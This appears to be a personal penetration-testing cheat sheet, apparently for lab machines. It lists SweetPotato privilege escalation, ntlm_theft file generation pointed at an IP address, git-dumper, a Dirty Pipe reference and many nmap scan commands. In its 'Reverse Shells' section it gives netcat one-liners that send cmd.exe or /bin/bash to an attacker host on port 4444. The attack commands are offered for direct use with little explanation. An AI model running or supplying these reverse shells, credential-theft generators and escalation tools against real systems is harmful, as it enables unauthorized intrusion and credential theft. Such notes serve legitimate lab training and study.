<img width="482" height="50" alt="image" src="https://github.com/user-attachments/assets/1eb2faf6-1ffa-4dfe-b21d-338d6ea65d4b" />


### 🥔 SweetPotato Exploit

Repository: https://github.com/uknowsec/SweetPotato

    SweetPotato.exe

### 🐍 Python Fix (Dirsearch pyparsing issue)

    python3 -m pip install --force-reinstall pyparsing

### 🔐 NTLM Theft

Repo: https://github.com/mtth-bfft/ntlm_theft
 (or whichever you're using)

    python ntlm_theft.py -g all -s 192.168.45.212 -f test

### 🧨 Dirty Pipe Exploit

Linux Priv Esc:
https://github.com/rexpository/linux-privilege-escalation

### 📂 Git Dumper

Repo: https://github.com/arthaud/git-dumper

    ./git_dumper.py http://website.com/.git ~/website

### 📁 File Backup Commands (Windows)

#### CMD:

    copy admintool.exe admintool_backup.exe
    copy admintool.exe C:\backup\admintool_backup.exe


#### PowerShell:

    Copy-Item admintool.exe -Destination C:\backup\admintool_backup.exe


Backup example:

    admintool_backup1.exe

### 🌐 Reverse Shells

#### Windows (Netcat):

    .\nc64.exe -e cmd.exe 192.168.45.196 4444


#### Linux:

    nc <attacker_ip> 4444 -e /bin/bash

### 🔍 Nmap Scans

### Full port scan:

    sudo nmap -sV -T4 -p- -A 192.168.157.117


### Basic enumeration:

    nmap -v -p- 192.168.241.250


### Targeted ports:

    nmap -v -sV -sT -A -O -sC -p 135,139,445,3389,5040 192.168.241.250

📚 Useful Pentesting References
🔗 Important Resources

🔹 Google Meet:
https://meet.google.com/shb-fnmq-uhg

🔹 HackTricks – Brute Force Techniques:
https://book.hacktricks.wiki/en/generic-hacking/brute-force.html

🔹 Windows Privilege Escalation – Internal All The Things:
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/

🔹 HTB Machines – Writeups & References:
https://htbmachines.github.io/

## ⚡ Nmap Commands CheatSheet

### 🔍 Basic & Full Scans

    sudo nmap -sC -sV -vv -oA nmap/caption 10.10.11.33
    sudo nmap -sC -sV -vv -oA 10.10.11.33
    nmap -v -sT -sV -T4 -p- 192.168.1.172

### 📄 Output to File

    nmap -v -sT -sC -A -O -p- 192.168.1.172 -o nmapoutput.txt
    nmap -v -sT -sV -sC -A -O -p 80,443 192.168.1.172 -o nmapoutput2.txt

### 🔢 Port-Specific Scans

    nmap -v -sU -sV -sC -A -O -p 161,500 192.168.1.172
    nmap -T4 -p- -A 10.10.10.11

### 🚀 Fast Scans (High Speed)

    nmap -T5 --top-ports 10000 -sS -n -Pn --min-rate=1000 10.10.11.35      # TCP
    nmap -T5 --top-ports 2000 -sS -n -Pn --min-rate=50 10.10.176.148       # TCP
    nmap -T5 --top-ports 10000 -sU -n -Pn --min-rate=5000 10.10.10.116     # UDP

### 🧪 Script Scans

    nmap -sC -sV -v 10.10.10.82
    nmap -v -sT -p 445 --script=smb-vuln-* 192.168.1.winxp

